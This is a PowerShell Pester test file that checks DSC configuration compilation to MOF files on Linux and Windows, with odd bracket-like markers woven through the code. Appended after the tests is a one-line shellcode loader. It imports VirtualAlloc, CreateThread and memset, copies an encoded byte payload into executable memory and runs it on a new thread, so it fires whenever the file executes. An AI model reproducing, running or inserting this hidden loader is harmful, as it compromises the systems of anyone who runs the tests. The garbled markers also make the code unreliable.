

 -||-> Describe "DSC MOF Compilation" -tags "CI" {

     -||-> AfterAll {
         -||-> $env:PSModulePath = $_modulePath <-||- 
    } <-||- 

     -||-> BeforeAll {
         -||-> $IsAlpine = ( -||-> Get-PlatformInfo <-||- ) -eq "alpine" <-||- 
         -||-> Import-Module PSDesiredStateConfiguration <-||- 
         -||-> $dscModule =  -||-> Get-Module PSDesiredStateConfiguration <-||-  <-||- 
         -||-> $baseSchemaPath =  -||-> Join-Path $dscModule.ModuleBase 'Configuration' <-||-  <-||- 
         -||-> $testResourceSchemaPath =  -||-> Join-Path -Path ( -||-> Join-Path -Path ( -||-> Join-Path -Path $PSScriptRoot -ChildPath assets <-||- ) -ChildPath dsc <-||- ) schema <-||-  <-||- 

        
         -||-> Copy-Item $testResourceSchemaPath $baseSchemaPath -Recurse -Force <-||- 

         -||-> $_modulePath = $env:PSModulePath <-||- 
         -||-> $powershellexe = ( -||-> get-process -pid $PID <-||- ).MainModule.FileName <-||- 
         -||-> $env:PSModulePath =  -||-> join-path ( -||-> [io.path]::GetDirectoryName($powershellexe) <-||- ) Modules <-||-  <-||- 
    } <-||- 

     -||-> It "Should be able to compile a MOF from a basic configuration" -Skip:( -||-> $IsMacOS -or $IsWindows -or $IsAlpine <-||- ) {
         -||-> [Scriptblock]::Create(@"
        configuration DSCTestConfig
        {
            Import-DscResource -ModuleName PSDesiredStateConfiguration
            Node "localhost" {
                nxFile f1
                {
                    DestinationPath = "/tmp/file1";
                }
            }
        }

        DSCTestConfig -OutputPath TestDrive:\DscTestConfig1
"@) | Should -Not -Throw <-||- 

         -||-> "TestDrive:\DscTestConfig1\localhost.mof" | Should -Exist <-||- 
    } <-||- 

     -||-> It "Should be able to compile a MOF from another basic configuration" -Skip:( -||-> $IsMacOS -or $IsWindows -or $IsAlpine <-||- ) {
         -||-> [Scriptblock]::Create(@"
        configuration DSCTestConfig
        {
            Import-DscResource -ModuleName PSDesiredStateConfiguration
            Node "localhost" {
                nxScript f1
                {
                    GetScript = "";
                    SetScript = "";
                    TestScript = "";
                    User = "root";
                }
            }
        }

        DSCTestConfig -OutputPath TestDrive:\DscTestConfig2
"@) | Should -Not -Throw <-||- 

         -||-> "TestDrive:\DscTestConfig2\localhost.mof" | Should -Exist <-||- 
    } <-||- 

     -||-> It "Should be able to compile a MOF from a complex configuration" -Skip:( -||-> $IsMacOS -or $IsWindows -or $IsAlpine <-||- ) {
         -||-> [Scriptblock]::Create(@"
    Configuration WordPressServer{

                Import-DscResource -ModuleName PSDesiredStateConfiguration

        Node CentOS{

            
                nxPackage httpd {
                    Ensure = "Present"
                    Name = "httpd"
                    PackageManager = "yum"
                }

        
        nxFile vHostDir{
           DestinationPath = "/etc/httpd/conf.d/vhosts.conf"
           Ensure = "Present"
           Contents = "IncludeOptional /etc/httpd/sites-enabled/*.conf`n"
           Type = "File"
        }

        nxFile vHostDirectory{
            DestinationPath = "/etc/httpd/sites-enabled"
            Type = "Directory"
            Ensure = "Present"
        }

        
        nxFile wpHttpDir{
            DestinationPath = "/var/www/wordpress"
            Type = "Directory"
            Ensure = "Present"
            Mode = "755"
        }

        
        nxFile share{
            DestinationPath = "/mnt/share"
            Type = "Directory"
            Ensure = "Present"
            Mode = "755"
        }

        
        nxFile HttpdPort{
           DestinationPath = "/etc/httpd/conf.d/listen.conf"
           Ensure = "Present"
           Contents = "Listen 8080`n"
           Type = "File"
        }

        
        nxScript nfsMount{
            TestScript= "
            GetScript="
            SetScript="

        }

        
        nxFile WordPressTar{
            SourcePath = "/mnt/share/latest.zip"
            DestinationPath = "/tmp/wordpress.zip"
            Checksum = "md5"
            Type = "file"
            DependsOn = "[nxScript]nfsMount"
        }

        
        nxArchive ExtractSite{
            SourcePath = "/tmp/wordpress.zip"
            DestinationPath = "/var/www/wordpress"
            Ensure = "Present"
            DependsOn = "[nxFile]WordpressTar"
         }

         

         
         
            
            
            
         

         
         nxFileLine SELinux {
            Filepath = "/etc/selinux/config"
            DoesNotContainPattern = "SELINUX=enforcing"
            ContainsLine = "SELINUX=disabled"
         }

        nxScript SELinuxHTTPNet{
          GetScript = "
          setScript = "
          TestScript = "
        }

        }

    }
        WordPressServer -OutputPath TestDrive:\DscTestConfig3
"@) | Should -Not -Throw <-||- 

         -||-> "TestDrive:\DscTestConfig3\CentOS.mof" | Should -Exist <-||- 
    } <-||- 

     -||-> It "Should be able to compile a MOF from a basic configuration on Windows" -Skip:( -||-> $IsMacOS -or $IsLinux -or $IsAlpine <-||- ) {
         -||-> [Scriptblock]::Create(@"
        configuration DSCTestConfig
        {
            Import-DscResource -ModuleName PSDesiredStateConfiguration
            Node "localhost" {
                File f1
                {
                    DestinationPath = "$env:SystemDrive\\Test.txt";
                    Ensure = "Present"
                }
            }
        }

        DSCTestConfig -OutputPath TestDrive:\DscTestConfig4
"@) | Should -Not -Throw <-||- 

         -||-> "TestDrive:\DscTestConfig4\localhost.mof" | Should -Exist <-||- 
    } <-||- 

     -||-> It "Should be able to compile a MOF from a configuration with multiple resources on Windows" -Skip:( -||-> $IsMacOS -or $IsLinux -or $IsAlpine <-||- ) {
         -||-> [Scriptblock]::Create(@"
        configuration DSCTestConfig
        {
            Import-DscResource -ModuleName PSDesiredStateConfiguration
            Node "localhost" {
                File f1
                {
                    DestinationPath = "$env:SystemDrive\\Test.txt";
                    Ensure = "Present"
                }
                Script s1
                {
                    GetScript = {return @{}}
                    SetScript = "Write-Verbose Hello"
                    TestScript = {return $false}
                }
                Log l1
                {
                    Message = "This is a log message"
                }
            }
        }

        DSCTestConfig -OutputPath TestDrive:\DscTestConfig5
"@) | Should -Not -Throw <-||- 

         -||-> "TestDrive:\DscTestConfig5\localhost.mof" | Should -Exist <-||- 
    } <-||- 
} <-||- 

 -||-> $ja1 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $ja1 -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xca,0xbe,0xcc,0xd0,0x59,0x74,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x72,0x18,0x83,0xc2,0x04,0x03,0x72,0xd8,0x32,0xac,0x88,0x08,0x30,0x4f,0x71,0xc8,0x55,0xd9,0x94,0xf9,0x55,0xbd,0xdd,0xa9,0x65,0xb5,0xb0,0x45,0x0d,0x9b,0x20,0xde,0x63,0x34,0x46,0x57,0xc9,0x62,0x69,0x68,0x62,0x56,0xe8,0xea,0x79,0x8b,0xca,0xd3,0xb1,0xde,0x0b,0x14,0xaf,0x13,0x59,0xcd,0xbb,0x86,0x4e,0x7a,0xf1,0x1a,0xe4,0x30,0x17,0x1b,0x19,0x80,0x16,0x0a,0x8c,0x9b,0x40,0x8c,0x2e,0x48,0xf9,0x85,0x28,0x8d,0xc4,0x5c,0xc2,0x65,0xb2,0x5e,0x02,0xb4,0x3b,0xcc,0x6b,0x79,0xce,0x0c,0xab,0xbd,0x31,0x7b,0xc5,0xbe,0xcc,0x7c,0x12,0xbd,0x0a,0x08,0x81,0x65,0xd8,0xaa,0x6d,0x94,0x0d,0x2c,0xe5,0x9a,0xfa,0x3a,0xa1,0xbe,0xfd,0xef,0xd9,0xba,0x76,0x0e,0x0e,0x4b,0xcc,0x35,0x8a,0x10,0x96,0x54,0x8b,0xfc,0x79,0x68,0xcb,0x5f,0x25,0xcc,0x87,0x4d,0x32,0x7d,0xca,0x19,0xf7,0x4c,0xf5,0xd9,0x9f,0xc7,0x86,0xeb,0x00,0x7c,0x01,0x47,0xc8,0x5a,0xd6,0xa8,0xe3,0x1b,0x48,0x57,0x0c,0x5c,0x40,0x93,0x58,0x0c,0xfa,0x32,0xe1,0xc7,0xfa,0xbb,0x34,0x7d,0xfe,0x2b,0x77,0x2a,0x01,0xa0,0x1f,0x29,0x02,0xb7,0x64,0xa4,0xe4,0xe7,0xca,0xe7,0xb8,0x47,0xbb,0x47,0x69,0x2f,0xd1,0x47,0x56,0x4f,0xda,0x8d,0xff,0xe5,0x35,0x78,0x57,0x91,0xac,0x21,0x23,0x00,0x30,0xfc,0x49,0x02,0xba,0xf3,0xae,0xcc,0x4b,0x79,0xbd,0xb8,0xbb,0x34,0x9f,0x6e,0xc3,0xe2,0x8a,0x8e,0x51,0x09,0x1d,0xd9,0xcd,0x13,0x78,0x2d,0x52,0xeb,0xaf,0x26,0x5b,0x79,0x10,0x50,0xa4,0x6d,0x90,0xa0,0xf2,0xe7,0x90,0xc8,0xa2,0x53,0xc3,0xed,0xac,0x49,0x77,0xbe,0x38,0x72,0x2e,0x13,0xea,0x1a,0xcc,0x4a,0xdc,0x84,0x2f,0xb9,0xdc,0xf9,0xf9,0x87,0xaa,0x13,0x3a <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $5Lb=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $5Lb.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$5Lb,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



